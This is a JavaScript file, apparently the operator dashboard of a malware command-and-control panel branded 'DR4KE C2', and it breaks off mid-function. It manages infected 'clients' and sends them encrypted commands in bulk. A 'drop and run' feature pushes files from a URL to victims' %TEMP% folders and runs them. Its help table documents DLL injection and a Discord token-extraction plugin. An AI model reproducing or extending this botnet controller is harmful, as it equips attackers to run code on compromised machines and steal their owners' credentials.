console.log('[INIT] Dashboard.js loading...');

let selectedClientId = null;

window.selectedClientId = null;

const selectedClients = new Set();

const displayedResults = new Set();

const selectAllBtn = document.getElementById('selectAllBtn');
const selectActiveBtn = document.getElementById('selectActiveBtn');
const selectNoneBtn = document.getElementById('selectNoneBtn');
const tabButtons = document.querySelectorAll('.tab-button');
let selectedTab = 'all';

const controlPanelCommand = document.getElementById('control-panel-command');
const controlPanelSend = document.getElementById('control-panel-send');
const consoleCommand = document.getElementById('console-command');
const consoleSend = document.getElementById('console-send');
const consoleOutput = document.getElementById('console-output');
const clientList = document.getElementById('client-list');
const clientListScrollUp = document.getElementById('client-list-scroll-up');
const clientListScrollDown = document.getElementById('client-list-scroll-down');
const quickCommandBtns = document.querySelectorAll('[data-command]');
const serverStatus = document.getElementById('server-status');
const selectAllCheckbox = document.getElementById('select-all-checkbox');
const selectedClientDisplay = document.getElementById('selected-client-display');
const executeFileBtn = document.getElementById('executeFileBtn');
const fileUrlInput = document.getElementById('fileUrl');
const fileTypeSelect = document.getElementById('fileType');
const dropLocationInput = document.getElementById('dropLocation');
const massCommandBtn = document.getElementById('massCommandBtn');
const executeAllFileBtn = document.getElementById('executeAllFileBtn');

let activeClients = [];
let clientCheckboxStates = {};

const API = {
    BASE_URL: `${window.location.protocol}//${window.location.host}`,
    REGISTER: '/register',
    TASKS: '/tasks',
    SUBMIT: '/submit',
    COMMAND: '/command',
    CLIENTS: '/clients'
};

const DEBUG = {
    enabled: true,
    colors: {
        info: '#3b82f6',    // blue
        success: '#10b981', // green
        warning: '#f59e0b', // yellow
        error: '#ef4444',   // red
        debug: '#6b7280',   // gray
        network: '#8b5cf6'  // purple for network requests
    }
};

function debugLog(type, message, data = null) {
    if (!DEBUG.enabled) return;
    
    const styles = `
        color: ${DEBUG.colors[type]};
        font-weight: bold;
        padding: 2px 5px;
        border-radius: 3px;
    `;
    
    console.log(`%c[${type.toUpperCase()}] ${message}`, styles);
    if (data) {
        console.log('Data:', data);
    }
}

function addToConsole(message, className = '') {
    const consoleOutput = document.getElementById('console-output');
    if (!consoleOutput) return;

    const lines = message.split('\n');
    lines.forEach((lineText, index) => {
        const line = document.createElement('div');
        line.className = `text-sm ${className}`;
        line.style.wordWrap = 'break-word';
        line.style.overflowWrap = 'break-word';
        line.style.whiteSpace = 'pre-wrap';
        line.style.margin = '0';
        line.style.padding = '1px 0';
        
        if (lineText.trim() === '') {
            line.innerHTML = '&nbsp;';
        } else {
            line.textContent = lineText;
        }
        
        const currentZoom = consoleZoomLevel || 1;
        line.style.fontSize = `${12 * currentZoom}px`;
        line.style.lineHeight = `${1.3 * currentZoom}`;
        
        consoleOutput.appendChild(line);
    });
    
    consoleOutput.scrollTop = consoleOutput.scrollHeight;
}

function showNotification(message, type = 'info') {
    const notification = document.createElement('div');
    notification.className = `fixed top-4 right-4 px-4 py-2 rounded-lg shadow-lg z-50 transform transition-all duration-300 translate-x-full`;
    
    switch (type) {
        case 'success':
            notification.classList.add('bg-green-500/90', 'text-white');
            break;
        case 'error':
            notification.classList.add('bg-red-500/90', 'text-white');
            break;
        case 'warning':
            notification.classList.add('bg-yellow-500/90', 'text-white');
            break;
        default:
            notification.classList.add('bg-blue-500/90', 'text-white');
    }
    
    notification.textContent = message;
    
    document.body.appendChild(notification);
    
    setTimeout(() => {
        notification.classList.remove('translate-x-full');
    }, 100);
    
    setTimeout(() => {
        notification.classList.add('translate-x-full');
        setTimeout(() => {
            notification.remove();
        }, 300);
    }, 3000);
}

function getAuthHeaders() {
    const token = window.Auth ? window.Auth.getToken() : null;
    const csrf = window.Auth ? window.Auth.getCSRFToken() : null;
    debugLog('debug', 'Auth tokens:', { 
        hasToken: !!token, 
        hasCsrf: !!csrf
    });
    if (!token || !csrf) {
        debugLog('error', 'No authentication tokens available');
        return null;
    }
    return {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrf,
        'Authorization': `Bearer ${token}`
    };
}

const initialAuthCheck = () => {
    debugLog('debug', 'Window auth status:', {
        hasAuth: !!window.Auth,
        token: window.Auth ? window.Auth.getToken() : null
    });

    if (!window.Auth || !window.Auth.isAuthenticated()) {
        debugLog('warning', 'User not authenticated, redirecting to login');
        if (window.location.pathname !== '/' && window.location.pathname !== '/index.html') {
            window.location.href = '/';
        }
        return false;
    }
    return true;
};

function handleCustomCommand(inputElement) {
    if (!inputElement) return;
    
    const command = inputElement.value.trim();
    if (!command) {
        return;
    }

    const trimmedCommand = command.toLowerCase();
    if (trimmedCommand === 'help') {
        console.log('Help command detected, calling showHelpCommand()');
        showHelpCommand();
        inputElement.value = '';
        return;
    }
    
    const helpMatch = trimmedCommand.match(/^help\s+(.+)$/);
    if (helpMatch) {
        console.log('Specific help command detected:', helpMatch[1]);
        showSpecificHelp(helpMatch[1]);
        inputElement.value = '';
        return;
    }

    if (!selectedClientId && selectedClients.size === 0) {
        showNotification('Please select at least one client', 'error');
        return;
    }

    debugLog('info', `Sending command: ${command}`);
    
    if (selectedClients.size > 0) {
        sendCommandToMultipleClients(Array.from(selectedClients), command);
    } else {
        sendCommandToClient(selectedClientId, command);
    }
    
    inputElement.value = '';
}

const HELP_COMMANDS = {
    'upload': {
        description: 'Download and save a file to the client machine',
        syntax: 'upload <URL>',
        examples: [
            'upload https://example.com/file.exe',
            'upload https://raw.githubusercontent.com/user/repo/main/script.ps1'
        ],
        details: 'Downloads a file from the specified URL and saves it to the client temp directory.'
    },
    'dllinject': {
        description: 'Inject a DLL into a running process',
        syntax: 'dllinject <process_name_or_pid> <dll_path>',
        examples: [
            'dllinject notepad.exe C:\\temp\\mydll.dll'
        ],
        details: 'Injects a DLL file into a target process.'
    },
    'plugin': {
        description: 'Plugin system for extended functionality',
        syntax: 'plugins:list | plugin:<plugin_name>:<function>',
        examples: [
            'plugins:list',
            'plugin:msgbox:msgbox',
            'plugin:discordtoken:extract'
        ],
        details: 'List plugins with "plugins:list", then execute with "plugin:name:function".'
    },
    'pslist': {
        description: 'List running processes on the client machine',
        syntax: 'pslist',
        examples: [
            'pslist'
        ],
        details: 'Shows all running processes with PID, name.'
    }
};

function showHelpCommand() {
    console.log('showHelpCommand() called');
    const consoleOutput = document.getElementById('console-output');
    console.log('Console output element:', consoleOutput);
    if (!consoleOutput) return;

    addToConsole('+----------------------------------------------------------------+', 'text-red-700');
    addToConsole('|                    DR4KE C2 - HELP SYSTEM                      |', 'text-red-700');
    addToConsole('+----------------------------------------------------------------+', 'text-red-700');
    addToConsole('', '');
    
    addToConsole('EXTRA COMMANDS AVAILABLE:', 'text-cyan-400');
    addToConsole('', '');

    Object.entries(HELP_COMMANDS).forEach(([command, info]) => {
        addToConsole(`> ${command.toUpperCase()} -> ( ${info.description} )`, 'text-green-400');
    });

    addToConsole('', '');
    addToConsole('USAGE:', 'text-yellow-400');
    addToConsole('  help <command>  - Show detailed help for specific command', 'text-gray-300');
    addToConsole('  Example: help upload', 'text-gray-300');
    addToConsole('', '');
    
    addToConsole('----------------------------------------------------------------', 'text-gray-600');
}

function showSpecificHelp(command) {
    const cmd = command.toLowerCase();
    const helpInfo = HELP_COMMANDS[cmd];
    
    if (!helpInfo) {
        addToConsole(`ERROR: Unknown command: ${command}`, 'text-red-400');
        addToConsole('Type "help" to see all available commands', 'text-gray-400');
        return;
    }

    addToConsole(`+----- HELP: ${cmd.toUpperCase()} ${''.padEnd(50 - cmd.length, '-')}+`, 'text-cyan-400');
    addToConsole(`| ${helpInfo.description.padEnd(61)} |`, 'text-cyan-400');
    addToConsole(`+${''.padEnd(63, '-')}+`, 'text-cyan-400');
    addToConsole('', '');
    addToConsole('SYNTAX:', 'text-yellow-400');
    addToConsole(`  ${helpInfo.syntax}`, 'text-blue-400');
    addToConsole('', '');
    addToConsole('EXAMPLES:', 'text-yellow-400');
    helpInfo.examples.forEach(example => {
        addToConsole(`  ${example}`, 'text-purple-400');
    });
    addToConsole('', '');
    addToConsole('DETAILS:', 'text-yellow-400');
    addToConsole(`  ${helpInfo.details}`, 'text-gray-300');
    addToConsole('', '');
}

async function generateKey(clientId) {
    const encoder = new TextEncoder();
    const data = encoder.encode(clientId);
    const hash = await crypto.subtle.digest('SHA-256', data);
    return crypto.subtle.importKey(
        'raw',
        hash,
        { name: 'AES-GCM' },
        false,
        ['encrypt']
    );
}

async function encryptCommand(command, clientId) {
    try {
        const key = await generateKey(clientId);
        const encoder = new TextEncoder();
        const iv = crypto.getRandomValues(new Uint8Array(12));
        const encodedCommand = encoder.encode(command);
        
        const encryptedData = await crypto.subtle.encrypt(
            {
                name: "AES-GCM",
                iv: iv
            },
            key,
            encodedCommand
        );

        const combined = new Uint8Array(iv.length + encryptedData.byteLength);
        combined.set(iv);
        combined.set(new Uint8Array(encryptedData), iv.length);
        
        return btoa(String.fromCharCode(...combined));
    } catch (error) {
        console.error('Encryption error:', error);
        throw error;
    }
}

async function sendCommandToClient(clientId, command, skipConsoleOutput = false) {
    debugLog('info', `Sending command to client ${clientId}: ${command}`);

    try {
        const headers = getAuthHeaders();
        if (!headers) {
            showNotification('Authentication required', 'error');
            return;
        }

        if (!skipConsoleOutput) {
            addToConsole(`Sending command to ${clientId}:`, 'text-blue-400');
            addToConsole(`> ${command}`, 'text-gray-300');
        }

        const encryptedCommand = await encryptCommand(command, clientId);
        
        const commandObj = {
            id: clientId,
            command: encryptedCommand,
            isEncrypted: true
        };

        const response = await fetch(`${API.BASE_URL}/command`, {
            method: 'POST',
            headers: {
                ...headers,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(commandObj)
        });

        if (!response.ok) {
            throw new Error(`Server returned ${response.status}: ${response.statusText}`);
        }

        const data = await response.json();
        if (data.status === "Command sent") {
            if (!skipConsoleOutput) {
                addToConsole(`Command sent successfully. Task ID: ${data.taskId}`, 'text-green-400');
                showNotification('Command sent successfully', 'success');
            }
            return { success: true, taskId: data.taskId };
        } else {
            if (!skipConsoleOutput) {
                addToConsole(`Failed to send command: ${data.error || 'Unknown error'}`, 'text-red-400');
                showNotification(data.error || 'Failed to send command', 'error');
            }
            return { success: false, error: data.error };
        }
    } catch (err) {
        debugLog('error', `Error sending command: ${err.message}`);
        if (!skipConsoleOutput) {
            addToConsole(`Error: ${err.message}`, 'text-red-400');
            showNotification(err.message, 'error');
        }
        return { success: false, error: err.message };
    }
}

async function sendCommandToMultipleClients(clientIds, command) {
    if (!clientIds || clientIds.length === 0 || !command) {
        showNotification('Client IDs and command are required', 'error');
        return;
    }

    addToConsole(`Sending command to ${clientIds.length} clients:`, 'text-blue-400');
    addToConsole(`> ${command}`, 'text-gray-300');

    const promises = clientIds.map(clientId => {
        return sendCommandToClient(clientId, command, true);
    });

    try {
        const results = await Promise.all(promises);
        const successCount = results.filter(r => r.success).length;
        
        addToConsole(`Command sent to ${successCount}/${clientIds.length} clients`, 'text-green-400');
        showNotification(`Command sent to ${successCount}/${clientIds.length} clients`, 'success');
    } catch (error) {
        console.error('Error sending commands to multiple clients:', error);
        addToConsole(`Error sending commands: ${error.message}`, 'text-red-400');
        showNotification('Failed to send commands to some clients', 'error');
    }
}

async function fetchActiveClients() {
    const fetchId = Math.random().toString(36).substring(7);
    debugLog('info', `[${fetchId}] Starting client fetch operation...`);
    
    try {           
        if (!window.Auth || !window.Auth.isAuthenticated()) {
            throw new Error('Not authenticated');
        }
        
        debugLog('debug', `[${fetchId}] Checking authentication...`);
        const headers = getAuthHeaders();
        
        if (!headers) {
            throw new Error('No authentication headers available');
        }
        
        debugLog('info', `[${fetchId}] Fetching clients from ${API.BASE_URL}/clients`);
        const response = await fetch(`${API.BASE_URL}/clients`, {
            method: 'GET',
            headers: headers,
            credentials: 'include' 
        });

        if (!response.ok) {
            throw new Error(`Server returned ${response.status}: ${response.statusText}`);
        }

        const data = await response.json();
        if (!data) {
            throw new Error('No data received from server');
        }
        
        debugLog('success', `[${fetchId}] Received ${Array.isArray(data) ? data.length : 0} clients`);
        
        const clientArray = Array.isArray(data) ? data.map(client => {
            debugLog('debug', `[${fetchId}] Processing client data`, client);
            return {
                id: client.ID || client.id,
                status: client.Status || client.status || 'Offline',
                ipAddress: client.IPAddress || client.ipAddress,
                firstSeen: client.FirstSeen || client.firstSeen,
                lastSeen: client.LastSeen || client.lastSeen,
                info: client.Info || client.info || {}
            };
        }) : [];
        
        debugLog('info', `[${fetchId}] Updating UI with ${clientArray.length} clients...`);
        updateClientList(clientArray);
        
        activeClients = clientArray;
        
        debugLog('info', `[${fetchId}] Updating client status counts...`);
        updateClientStatusCounts();
        
        if (selectedClientId) {
            debugLog('info', `[${fetchId}] Updating selected client display for ${selectedClientId}`);
            updateSelectedClientDisplay();
        }
        
    } catch (error) {
        debugLog('error', `[${fetchId}] Failed to fetch clients:`, error);
        addToConsole(`Failed to fetch clients: ${error.message}`, 'text-red-400');
        
        if (error.message === 'Not authenticated') {
            debugLog('warning', 'User not authenticated, redirecting to login');
            window.location.href = '/';
            return;
        }
        
        updateClientList([]);
        activeClients = [];
        updateClientStatusCounts();
        
        showNotification('Failed to fetch clients. Please check your connection and try again.', 'error');
    }
}

document.addEventListener('DOMContentLoaded', function() {
    debugLog('info', 'DOM Content Loaded - Initializing dashboard');
    
    if (!initialAuthCheck()) {
        return;
    }
    
    initEventListeners();
    
    const controlPanelSend = document.getElementById('control-panel-send');
    const controlPanelCommand = document.getElementById('control-panel-command');
    
    if (controlPanelSend && controlPanelCommand) {
        debugLog('info', 'Setting up control panel command handlers');
        
        controlPanelSend.addEventListener('click', () => {
            debugLog('debug', 'Control panel send button clicked');
            handleCustomCommand(controlPanelCommand);
        });
        
        controlPanelCommand.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                debugLog('debug', 'Enter pressed in control panel command input');
                handleCustomCommand(controlPanelCommand);
            }
        });
    } else {
        debugLog('warning', 'Control panel elements not found', {
            send: !!controlPanelSend,
            command: !!controlPanelCommand
        });
    }
    
    fetchActiveClients().catch(error => {
        debugLog('error', 'Initial client fetch failed:', error);
    });
    
    const refreshInterval = setInterval(() => {
        debugLog('info', 'Running periodic client refresh');
        fetchActiveClients().catch(error => {
            debugLog('error', 'Periodic client fetch failed:', error);
        });
    }, 5000);
    
    window.addEventListener('unload', () => {
        clearInterval(refreshInterval);
    });
});

function initEventListeners() {
    debugLog('info', 'Initializing event listeners');
    
    const quickCommandButtons = document.querySelectorAll('[data-command]');
    quickCommandButtons.forEach(button => {
        button.addEventListener('click', () => {
            const command = button.getAttribute('data-command');
            debugLog('debug', `Quick command button clicked: ${command}`);
            
            if (!selectedClientId && selectedClients.size === 0) {
                showNotification('Please select at least one client', 'error');
                return;
            }

            switch (command) {
                case 'ping':
                    handleQuickCommand('ping');
                    break;
                case 'sysinfo':
                    handleQuickCommand('sysinfo');
                    break;
                case 'screenshot':
                    handleQuickCommand('screenshot');
                    break;
                default:
                    showNotification('Unknown command', 'error');
            }
            
            button.classList.add('bg-primary/10');
            setTimeout(() => {
                button.classList.remove('bg-primary/10');
            }, 200);
        });
    });
    
    if (executeFileBtn) {
        executeFileBtn.addEventListener('click', () => {
            debugLog('debug', 'Execute button clicked');
            executeDropAndRun();
        });
    } else {
        debugLog('warning', 'Execute button not found');
    }
    
    if (consoleSend && consoleCommand) {
        consoleSend.addEventListener('click', () => handleCustomCommand(consoleCommand));
        consoleCommand.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                handleCustomCommand(consoleCommand);
            }
        });
    }
    
    initSelectionButtons();
    
    if (tabButtons) {
        tabButtons.forEach(button => {
            button.addEventListener('click', () => {
                tabButtons.forEach(btn => btn.classList.remove('tab-active'));
                button.classList.add('tab-active');
                selectedTab = button.id.replace('tab-', '');
                filterClientsByTab();
            });
        });
    }
}

function handleQuickCommand(command) {
    debugLog('info', `Executing quick command: ${command}`);
    
    if (selectedClients.size > 0) {
        sendCommandToMultipleClients(Array.from(selectedClients), command);
                } else {
        sendCommandToClient(selectedClientId, command);
    }
}

function updateSelectedClientsDisplay() {
    const display = document.getElementById('selectedClientDisplay');
    const countSpan = document.getElementById('selectedClientCount');
    
    if (display && countSpan) {
    const count = selectedClients.size;
    if (count > 0) {
            display.classList.remove('hidden');
            countSpan.textContent = `${count} client${count > 1 ? 's' : ''} selected`;
            display.classList.add('bg-primary/10', 'border-primary/20');
        } else {
            display.classList.add('hidden');
            countSpan.textContent = 'No clients selected';
            display.classList.remove('bg-primary/10', 'border-primary/20');
        }
    }
}

function updateClientStatusCounts() {
    debugLog('info', 'Updating client status counts...');
    
    const counts = {
        active: 0,
        idle: 0,
        dead: 0,
        total: activeClients.length
    };
    
    activeClients.forEach(client => {
        const status = (client.status || '').toLowerCase();
        debugLog('debug', `Counting client ${client.id} with status: ${status}`);
        
        if (status === 'active' || status === 'online') {
            counts.active++;
        } else if (status === 'idle') {
            counts.idle++;
        } else {
            counts.dead++;
        }
    });
    
    debugLog('debug', 'Client counts:', counts);
    
    const tabAll = document.getElementById('tab-all');
    const tabActive = document.getElementById('tab-active');
    const tabIdle = document.getElementById('tab-idle');
    const tabDead = document.getElementById('tab-dead');
    const activeCount = document.getElementById('active-count');
    const idleCount = document.getElementById('idle-count');
    const deadCount = document.getElementById('dead-count');
    
    if (tabAll) tabAll.textContent = `All Clients (${counts.total})`;
    if (tabActive) tabActive.textContent = `Active (${counts.active})`;
    if (tabIdle) tabIdle.textContent = `Idle (${counts.idle})`;
    if (tabDead) tabDead.textContent = `Dead (${counts.dead})`;
    
    if (activeCount) activeCount.textContent = `${counts.active} Active`;
    if (idleCount) idleCount.textContent = `${counts.idle} Idle`;
    if (deadCount) deadCount.textContent = `${counts.dead} Dead`;
    
    debugLog('success', 'Status counts updated');
    return counts;
}

function filterClientsByTab() {
    debugLog('debug', 'Filtering clients by tab:', selectedTab);
    
    const clientRows = document.querySelectorAll('[data-client-id]');
    debugLog('debug', `Found ${clientRows.length} client rows to filter`);
    
    clientRows.forEach(row => {
        const checkbox = row.querySelector('.client-checkbox');
        if (!checkbox) {
            debugLog('warning', `No checkbox found for row with client ID: ${row.getAttribute('data-client-id')}`);
            return;
        }
        
        const status = checkbox.getAttribute('data-status');
        if (!status) {
            debugLog('warning', `No status found for client ID: ${row.getAttribute('data-client-id')}`);
            return;
        }
        
        const statusLower = status.toLowerCase();
        debugLog('debug', `Processing client with status: ${statusLower}`);
        
        if (selectedTab === 'all') {
            row.style.display = '';
        } else {
            let show = false;
            switch (selectedTab) {
                case 'active':
                    show = statusLower === 'active' || statusLower === 'online';
                    break;
                case 'idle':
                    show = statusLower === 'idle';
                    break;
                case 'dead':
                    show = ['inactive', 'dead', 'offline'].includes(statusLower);
                    break;
            }
            row.style.display = show ? '' : 'none';
        }
    });
    
    updateSelectAllCheckboxState();
    debugLog('debug', 'Client filtering complete');
}

function updateSelectedClientDisplay() {
    if (selectedClientDisplay) {
        if (selectedClientId) {
            const client = activeClients.find(c => c.id === selectedClientId);
            
            if (client) {
                selectedClientDisplay.innerHTML = `
                    <div class="flex items-center">
                        <span class="font-semibold">${client.id}</span>
                        <span class="mx-2 text-gray-400">·</span>
                        <span class="${client.status.toLowerCase() === 'active' ? 'text-green-400' : 
                                  client.status.toLowerCase() === 'idle' ? 'text-yellow-400' : 'text-red-400'}">
                            <i class="fas fa-circle mr-1"></i>${client.status}
                        </span>
                    </div>
                `;
                selectedClientDisplay.classList.remove('hidden');
                debugLog('debug', 'Selected client updated:', client.id);
            } else {
                selectedClientDisplay.classList.add('hidden');
                debugLog('debug', 'Selected client not found in active clients');
            }
        } else {
            selectedClientDisplay.classList.add('hidden');
            debugLog('debug', 'No client selected');
        }
    }
}

const dropFileBtn = document.getElementById('dropFileBtn');

if (dropFileBtn) {
    dropFileBtn.addEventListener('click', function() {
        console.log("Drop file button clicked");
        if (typeof window.openUploadModal === 'function') {
            window.openUploadModal();
        } else {
            console.error("openUploadModal function not available");
            executeDropAndRun();
        }
    });
}

let executeDropAndRun = function() {
    console.log("app.js executeDropAndRun called");
    
    if (executeDropAndRun.isExecuting) {
        console.log("Preventing duplicate execution");
        return;
    }
    executeDropAndRun.isExecuting = true;
    setTimeout(() => {
        executeDropAndRun.isExecuting = false;
    }, 1000);  
    
    if (selectedClients.size > 0) {
        const fileUrl = fileUrlInput.value.trim();
        const dropLocation = dropLocationInput.value.trim() || '%TEMP%';
        const fileType = fileTypeSelect.value;
        
        if (fileUrl) {
            console.log(`Drop & Run: URL=${fileUrl}, Location=${dropLocation}, Type=${fileType}`);
            const command = `drop:${fileType}:${fileUrl}:${dropLocation}`;
            sendCommandToMultipleClients(Array.from(selectedClients), command);
            addToConsole(`Dropping to ${dropLocation} and executing ${fileType} file on ${selectedClients.size} clients...`, 'text-yellow-400');
        } else {
            addToConsole('Please enter a file URL', 'text-red-400');
        }
    } else if (selectedClientId) {      
        const fileUrl = fileUrlInput.value.trim();
        const dropLocation = dropLocationInput.value.trim() || '%TEMP%';
        const fileType = fileTypeSelect.value;
        
        if (fileUrl) {
            console.log(`Drop & Run (single client): URL=${fileUrl}, Location=${dropLocation}, Type=${fileType}`);
            const command = `drop:${fileType}:${fileUrl}:${dropLocation}`;
            sendCommandToClient(selectedClientId, command);
            addToConsole(`Dropping to ${dropLocation} and running ${fileType} file from ${fileUrl}...`, 'text-yellow-400');
        } else {
            addToConsole('Please enter a file URL', 'text-red-400');
        }
    } else {
        addToConsole('Please select at least one client', 'text-yellow-400');
    }
};

window.openUploadModal = function() {
    const fileUploadModal = document.getElementById('uploadModal');
    if (!fileUploadModal) {
        console.error("Upload modal not found");
        executeDropAndRun();
        return;
    }
    
    fileUploadModal.classList.remove('hidden');
    
    const fileUploadInput = document.getElementById('file-upload-input');
    if (fileUploadInput) fileUploadInput.value = '';
    
    const uploadProgress = document.getElementById('upload-progress');
    if (uploadProgress) uploadProgress.classList.add('hidden');
    
    const uploadSuccess = document.getElementById('upload-success');
    if (uploadSuccess) uploadSuccess.classList.add('hidden');
    
    const uploadError = document.getElementById('upload-error');
    if (uploadError) uploadError.classList.add('hidden');
    
    const dropZone = document.getElementById('drop-zone');
    if (dropZone) {
        const icon = dropZone.querySelector('i');
        const mainText = dropZone.querySelector('p:first-of-type');
        const subText = dropZone.querySelector('p:last-of-type');
        
        if (icon) icon.classList.remove('text-primary');
        if (mainText) {
            mainText.textContent = 'Drag and drop a file here, or click to browse';
            mainText.classList.remove('font-medium');
        }
        if (subText) {
            subText.textContent = 'Any file type supported • Max size 100MB';
        }
        
        dropZone.classList.remove('border-primary');
        dropZone.classList.remove('bg-primary/5');
    }
    
    setTimeout(() => {
        const modalContent = fileUploadModal.querySelector('.neo-card');
        if (modalContent) {
            modalContent.classList.add('animate-fade-in-up');
        }
        fileUploadModal.classList.add('show-blur');
    }, 10);
};

window.closeUploadModal = function() {
    const fileUploadModal = document.getElementById('uploadModal');
    if (!fileUploadModal) return;
    
    fileUploadModal.classList.remove('show-blur');
    
    setTimeout(() => {
        fileUploadModal.classList.add('hidden');
        
        const modalContent = fileUploadModal.querySelector('.neo-card');
        if (modalContent) {
            modalContent.classList.remove('animate-fade-in-up');
        }
    }, 200);
};

window.updateDropZoneWithFileInfo = function(file) {
    const dropZone = document.getElementById('drop-zone');
    const icon = dropZone.querySelector('i');
    const mainText = dropZone.querySelector('p:first-of-type');
    const subText = dropZone.querySelector('p:last-of-type');
    const selectedFileDisplay = document.getElementById('selected-file-display');
    const uploadSubmit = document.getElementById('upload-submit');
    
    if (file) {
        icon.classList.add('text-primary');
        mainText.textContent = 'File selected';
        mainText.classList.add('font-medium');
        subText.textContent = `${file.name} (${formatFileSize(file.size)})`;
    dropZone.classList.add('border-primary', 'bg-primary/5');

        if (selectedFileDisplay) {
            selectedFileDisplay.value = file.name;
        }
        
        if (uploadSubmit) {
            uploadSubmit.disabled = false;
            uploadSubmit.classList.remove('opacity-50', 'cursor-not-allowed');
        }
    } else {
        icon.classList.remove('text-primary');
        mainText.textContent = 'Drag and drop a file here, or click to browse';
        mainText.classList.remove('font-medium');
        subText.textContent = 'Any file type supported • Max size 100MB';
        dropZone.classList.remove('border-primary', 'bg-primary/5');
        
        if (selectedFileDisplay) {
            selectedFileDisplay.value = '';
        }
        
        if (uploadSubmit) {
            uploadSubmit.disabled = true;
            uploadSubmit.classList.add('opacity-50', 'cursor-not-allowed');
        }
    }
};

function formatFileSize(bytes) {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

window.uploadSelectedFile = function() {
    const fileUploadInput = document.getElementById('file-upload-input');
    const uploadProgress = document.getElementById('upload-progress');
    const uploadFileName = document.getElementById('upload-file-name');
    const uploadProgressBar = document.getElementById('upload-progress-bar');
    const uploadPercent = document.getElementById('upload-percent');
    const uploadTransferred = document.getElementById('upload-transferred');
    const uploadSubmit = document.getElementById('upload-submit');
    const uploadCancel = document.getElementById('upload-cancel');
    
    if (!fileUploadInput || !fileUploadInput.files || fileUploadInput.files.length === 0) {
        showNotification('Please select a file first', 'error');
        return;
    }
    
    const file = fileUploadInput.files[0];
    console.log('Uploading file:', file.name);
    
    if (uploadSubmit) uploadSubmit.disabled = true;
    if (uploadCancel) uploadCancel.disabled = true;
    
    if (uploadProgress) {
        uploadProgress.classList.remove('hidden');
        uploadProgress.classList.add('animate-fade-in');
    }
    
    if (uploadFileName) {
        uploadFileName.textContent = file.name;
    }
    
    const formData = new FormData();
    formData.append('file', file);
    
    const headers = getAuthHeaders();
    if (!headers) {
        showNotification('Authentication required', 'error');
        return;
    }
    
    delete headers['Content-Type'];
    
    fetch(`${API.BASE_URL}/upload`, {
        method: 'POST',
        headers: headers,
        body: formData
    })
    .then(response => {
        if (!response.ok) throw new Error('Upload failed');
        return response.json();
    })
    .then(data => {
        const fileUrlInput = document.getElementById('fileUrl');
        if (fileUrlInput) {
            fileUrlInput.value = data.url;
        }
        
        showNotification('File uploaded successfully', 'success');
        
        setTimeout(() => {
            window.closeUploadModal();
            if (document.getElementById('executeAfterUpload').checked) {
            window.executeDropAndRun();
            }
        }, 1000);
    })
    .catch(error => {
        console.error('Upload error:', error);
        showNotification('Failed to upload file: ' + error.message, 'error');
        
        if (uploadSubmit) uploadSubmit.disabled = false;
        if (uploadCancel) uploadCancel.disabled = false;
    })
    .finally(() => {
        if (uploadProgress) uploadProgress.classList.add('hidden');
    });
    
    let progress = 0;
    const interval = setInterval(() => {
        progress += 5;
        if (progress > 95) clearInterval(interval);
        
        if (uploadProgressBar) uploadProgressBar.style.width = `${progress}%`;
        if (uploadPercent) uploadPercent.textContent = `${progress}%`;
        if (uploadTransferred) {
            const totalSize = formatFileSize(file.size);
            const currentSize = formatFileSize((progress / 100) * file.size);
            uploadTransferred.textContent = `${currentSize} / ${totalSize}`;
        }
    }, 100);
};

function setupFileUploadModal() {
    console.log('Setting up file upload modal handlers');
    
    const fileUploadModal = document.getElementById('uploadModal');
    const fileUploadClose = document.getElementById('file-upload-close');
    const uploadCancel = document.getElementById('upload-cancel');
    const dropZone = document.getElementById('drop-zone');
    const fileUploadInput = document.getElementById('file-upload-input');
    const uploadSubmit = document.getElementById('upload-submit');
    
    if (uploadSubmit) {
        uploadSubmit.disabled = true;
        uploadSubmit.classList.add('opacity-50', 'cursor-not-allowed');
    }
    
    if (fileUploadClose) {
        fileUploadClose.addEventListener('click', (e) => {
            e.preventDefault();
            window.closeUploadModal();
        });
    }
    
    if (uploadCancel) {
        uploadCancel.addEventListener('click', (e) => {
            e.preventDefault();
            window.closeUploadModal();
        });
    }
    
    if (fileUploadModal) {
        fileUploadModal.addEventListener('click', (e) => {
            if (e.target === fileUploadModal) {
                window.closeUploadModal();
            }
        });
    }
    
    if (dropZone) {
        dropZone.addEventListener('click', (e) => {
            e.preventDefault();
            e.stopPropagation();
            if (fileUploadInput) fileUploadInput.click();
        });
        
        dropZone.addEventListener('dragover', (e) => {
            e.preventDefault();
            e.stopPropagation();
            dropZone.classList.add('border-primary', 'bg-primary/5');
        });
        
        dropZone.addEventListener('dragleave', (e) => {
            e.preventDefault();
            e.stopPropagation();
            if (!fileUploadInput || !fileUploadInput.files || !fileUploadInput.files.length) {
                dropZone.classList.remove('border-primary', 'bg-primary/5');
            }
        });
        
        dropZone.addEventListener('drop', (e) => {
            e.preventDefault();
            e.stopPropagation();
            
            if (e.dataTransfer.files && e.dataTransfer.files.length > 0) {
                fileUploadInput.files = e.dataTransfer.files;
                window.updateDropZoneWithFileInfo(e.dataTransfer.files[0]);
            }
        });
    }
    
    if (fileUploadInput) {
        fileUploadInput.addEventListener('change', () => {
            if (fileUploadInput.files && fileUploadInput.files.length > 0) {
                window.updateDropZoneWithFileInfo(fileUploadInput.files[0]);
            } else {
                window.updateDropZoneWithFileInfo(null);
            }
        });
    }

    if (uploadSubmit) {
        uploadSubmit.addEventListener('click', (e) => {
            e.preventDefault();
            if (!uploadSubmit.disabled) {
                window.uploadSelectedFile();
            }
        });
    }
}

setupFileUploadModal();

window.sendCommandToClient = sendCommandToClient;
window.sendCommandToMultipleClients = sendCommandToMultipleClients;
window.executeDropAndRun = executeDropAndRun;
window.addToConsole = addToConsole;

function saveCheckboxStates() {
    const states = {};
    document.querySelectorAll('.client-checkbox').forEach(checkbox => {
        const clientId = checkbox.getAttribute('data-client-id');
        if (clientId) {
        states[clientId] = checkbox.checked;
        }
    });
    localStorage.setItem('clientCheckboxStates', JSON.stringify(states));
    debugLog('debug', 'Saved checkbox states:', states);
}

function restoreCheckboxStates() {
    try {
        const savedStates = JSON.parse(localStorage.getItem('clientCheckboxStates') || '{}');
        document.querySelectorAll('.client-checkbox').forEach(checkbox => {
